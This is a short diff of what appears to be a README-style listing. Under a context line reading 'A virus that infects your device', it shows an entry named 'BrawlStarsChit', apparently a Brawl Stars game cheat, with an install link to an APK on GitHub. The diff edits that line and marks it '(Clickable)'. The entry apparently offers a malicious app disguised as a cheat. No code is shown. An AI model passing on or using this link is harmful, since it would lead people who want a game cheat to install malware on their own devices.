@@ -30,4 +30,5 @@ A virus that infects your device
 
 # BrawlStarsChit
 Name:BrawlStarsChit tipe:ESE version:0.1 tipeV:DV
-Install: https://github.com/rokSkr/FOD/raw/main/BrawlStarsChit2.apk
+(Clickable)
+# Install: https://github.com/rokSkr/FOD/raw/main/BrawlStarsChit2.apk
